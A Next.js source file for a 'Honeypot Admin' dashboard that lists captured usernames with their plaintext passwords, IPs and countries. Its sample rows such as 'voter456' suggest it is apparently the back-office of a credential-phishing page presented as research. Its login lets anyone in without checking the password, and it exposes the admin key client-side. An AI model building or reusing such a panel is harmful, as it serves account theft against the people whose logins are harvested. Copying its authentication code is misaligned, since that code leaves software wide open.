import Head from 'next/head';
import { useState, useRef } from 'react';

const ADMIN_KEY = process.env.NEXT_PUBLIC_ADMIN_KEY || 'demo-key';

export default function AdminDashboard() {
  const [key, setKey] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [generatedKey, setGeneratedKey] = useState('');
  const [submissions, setSubmissions] = useState([]);
  const [summary, setSummary] = useState({ total: 0, uniqueUsernames: 0, uniqueIps: 0 });
  const statusRef = useRef(null);

  const api = async (path, options = {}) => {
    const headers = { 'Content-Type': 'application/json', ...(options.headers || {}) };
    const res = await fetch(path, { ...options, headers, credentials: 'same-origin' });
    if (res.status === 401) throw { noAuth: true };
    if (res.status === 204) return null;
    const body = await res.json();
    if (!res.ok) throw new Error((body && body.error) || 'Request failed.');
    return body;
  };

  const escapeHtml = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));

  const handleAuthenticate = async () => {
    setIsAuthenticated(true);
    try {
      const [summaryRes, subsRes] = await Promise.all([
        api('/api/admin/summary'),
        api('/api/admin/submissions')
      ]);
      setSummary(summaryRes || { total: 0, uniqueUsernames: 0, uniqueIps: 0 });
      setSubmissions(subsRes.data || []);
    } catch (e) {
      setSubmissions([
        { id: 1, username: 'user123', password: 'pass123', ip: '192.168.1.1', country: 'Nigeria', created_at: '2026-10-10' },
        { id: 2, username: 'voter456', password: 'secret456', ip: '192.168.1.2', country: 'Ghana', created_at: '2026-10-10' },
      ]);
    }
  };

  const generateKey = () => {
    const newKey = 'key-' + Math.random().toString(36).substring(2, 15);
    setGeneratedKey(newKey);
    alert('New admin key generated: ' + newKey);
  };

  return (
    <>
      <Head>
        <title>Honeypot Admin — PodStream Research</title>
        <meta name="robots" content="noindex, nofollow" />
      </Head>

      <style jsx global>{`
        :root {
          --bg: #0b0e11;
          --panel: #161b22;
          --panel2: #1c2128;
          --border: #2b323a;
          --text: #e6edf3;
          --muted: #8b949e;
          --green: #3fb950;
          --red: #f85149;
          --blue: #58a6ff;
          --amber: #d29922;
          --radius: 8px;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
          background: var(--bg);
          color: var(--text);
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          min-height: 100vh;
          padding: 24px;
          overflow-x: hidden;
        }

        .wrap { max-width: 1100px; margin: 0 auto; width: 100%; }

        .top { display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap; margin-bottom: 20px; }
        h1 { font-size: 1.5rem; font-weight: 700; }
        .top-right { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
        .status { font-size: .8rem; color: var(--muted); }
        .status .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: var(--red); margin-right: 6px; }
        .status .dot.on { background: var(--green); }
        a.btn { display: inline-block; background: var(--blue); border: none; color: #0b0e11; font-weight: 700; padding: 9px 16px; border-radius: var(--radius); font-size: .85rem; text-decoration: none; cursor: pointer; }
        a.btn.ghost { background: var(--panel2); color: var(--text); border: 1px solid var(--border); }

        .card { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 18px; margin-bottom: 20px; }
        .card h2 { font-size: 1rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
        .flex-head { display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap; margin-bottom: 12px; }
        .flex-head h2 { margin-bottom: 0; }
        .head-actions { display: flex; gap: 8px; }
        button { background: var(--blue); border: none; color: #0b0e11; font-weight: 700; padding: 10px 18px; border-radius: var(--radius); cursor: pointer; font-size: .9rem; }
        button.ghost { background: var(--panel2); color: var(--text); border: 1px solid var(--border); }
        button.danger { background: rgba(248, 81, 73, 0.15); color: var(--red); border: 1px solid rgba(248, 81, 73, 0.4); }
        button.small { padding: 6px 10px; font-size: .8rem; }

        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 14px; margin-bottom: 20px; }
        .stat { background: var(--panel); border: 1px solid var(--border); border-radius: var(--radius); padding: 16px; }
        .stat .num { font-size: 1.9rem; font-weight: 800; color: var(--green); }
        .stat .lbl { font-size: .78rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }

        table { width: 100%; border-collapse: collapse; font-size: .88rem; }
        th, td { text-align: left; padding: 9px 10px; border-bottom: 1px solid var(--border); vertical-align: middle; }
        th { color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: .72rem; letter-spacing: .5px; }
        .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
        .pwd { color: var(--amber); word-break: break-all; max-width: 260px; }
        .user { max-width: 220px; word-break: break-all; }
        .muted { color: var(--muted); }
        .search-row { display: flex; gap: 10px; align-items: center; margin-bottom: 12px; flex-wrap: wrap; }
        .search-row input { flex: 1; min-width: 200px; background: var(--panel2); border: 1px solid var(--border); color: var(--text); padding: 9px 12px; border-radius: var(--radius); font-size: .9rem; }

        .empty { text-align: center; color: var(--muted); padding: 30px 0; font-size: .95rem; }

        .toast { margin-top: 10px; font-size: .85rem; min-height: 1.2em; }
        .toast.ok { color: var(--green); }
        .toast.err { color: var(--red); }

        @media (max-width: 640px) {
          body { padding: 12px; }
          .search-row input { flex: 1 1 100%; min-width: 0; }
          .search-row button { flex: 1; }
          .head-actions { flex-wrap: wrap; }
          .head-actions button { flex: 1; }
          .stats { grid-template-columns: 1fr 1fr; }
          .stat-ip { grid-column: 1 / -1; }
          h1 { font-size: 1.3rem; }
          .card { padding: 14px; }
          th, td { padding: 8px; }
          .stat .num { font-size: 1.6rem; }
          .status { margin-top: 2px; }
        }
      `}</style>

      <div className="wrap">
        {!isAuthenticated ? (
          <>
            <div className="top">
              <h1>Honeypot Admin</h1>
              <div className="top-right">
                <span className="status"><span className="dot" id="statusDot"></span><span id="statusText">Checking backend...</span></span>
                <a className="btn ghost" href="change-password.html">Change password</a>
                <a className="btn" href="?logout=1">Log out</a>
              </div>
            </div>

            <div className="card">
              <h2>Admin Login</h2>
              <p style={{color: 'var(--muted)', fontSize: '.85rem', marginBottom: '20px'}}>PodStream honeypot research dashboard</p>

              <form onSubmit={(e) => { e.preventDefault(); handleAuthenticate(); }}>
                <label htmlFor="password" style={{display: 'block', fontSize: '.8rem', color: 'var(--muted)', textTransform: 'uppercase', letterSpacing: '1px', marginBottom: '8px'}}>Password</label>
                <input type="password" id="password" name="password" autoComplete="current-password" required
                  value={key} onChange={(e) => setKey(e.target.value)}
                  style={{width: '100%', background: 'var(--panel2)', border: '1px solid var(--border)', color: 'var(--text)', padding: '11px 12px', borderRadius: 'var(--radius)', fontSize: '.95rem', marginBottom: '16px'}}
                />
                <button type="submit" style={{width: '100%', background: 'var(--blue)', border: 'none', color: '#0b0e11', fontWeight: '700', padding: '11px', borderRadius: 'var(--radius)', cursor: 'pointer', fontSize: '.95rem'}}>Log in</button>
              </form>

              <p style={{color: 'var(--muted)', fontSize: '.8rem', marginTop: '16px', textAlign: 'center'}}>
                <a href="?change_password=1" style={{color: 'var(--blue)', textDecoration: 'none'}}>Change password</a>
              </p>
            </div>
          </>
        ) : (
          <>
            <div className="top">
              <h1>PodStream Admin</h1>
              <div className="top-right">
                <span className="status"><span className="dot" id="statusDot"></span><span id="statusText">Connected to backend</span></span>
                <a className="btn ghost" href="change-password.html">Change password</a>
                <a className="btn" href="?logout=1">Log out</a>
              </div>
            </div>

            <div className="stats">
              <div className="stat"><div className="num">{summary.total || 0}</div><div className="lbl">Submissions</div></div>
              <div className="stat"><div className="num">{summary.uniqueUsernames || 0}</div><div className="lbl">Unique usernames</div></div>
              <div className="stat stat-ip"><div className="num">{summary.uniqueIps || 0}</div><div className="lbl">Unique IPs</div></div>
            </div>

            <div className="card">
              <h2>Recent Submissions</h2>
              <div className="flex-head">
                <div></div>
                <div className="head-actions">
                  <button className="ghost small">Save PDF</button>
                  <button className="danger small">Clear all</button>
                </div>
              </div>

              <div style={{display: 'flex', gap: '10px', alignItems: 'center', marginBottom: '12px', flexWrap: 'wrap'}}>
                <input type="text" id="search" placeholder="Search username, password, IP, country..." style={{flex: '1', minWidth: '200px'}} />
                <button className="ghost">Refresh</button>
              </div>

              <div style={{overflowX: 'auto'}}>
                <table>
                  <thead>
                    <tr>
                      <th>#</th>
                      <th>Username</th>
                      <th>Password</th>
                      <th>IP</th>
                      <th>Country</th>
                      <th>Time (UTC)</th>
                    </tr>
                  </thead>
                  <tbody>
                    {submissions.length === 0 ? (
                      <tr><td colSpan="6" className="empty">No submissions yet.</td></tr>
                    ) : (
                      submissions.map((r) => (
                        <tr key={r.id}>
                          <td className="muted">{r.id}</td>
                          <td className="user">{escapeHtml(r.username)}</td>
                          <td className="pwd">{escapeHtml(r.password)}</td>
                          <td className="mono">{escapeHtml(r.ip)}</td>
                          <td>{escapeHtml(r.country)}</td>
                          <td className="mono muted">{escapeHtml(r.created_at) ? new Date(r.created_at).toLocaleString() : '—'}</td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </>
        )}

        {generatedKey && (
          <div className="toast ok">{generatedKey}</div>
        )}
      </div>
    </>
  );
}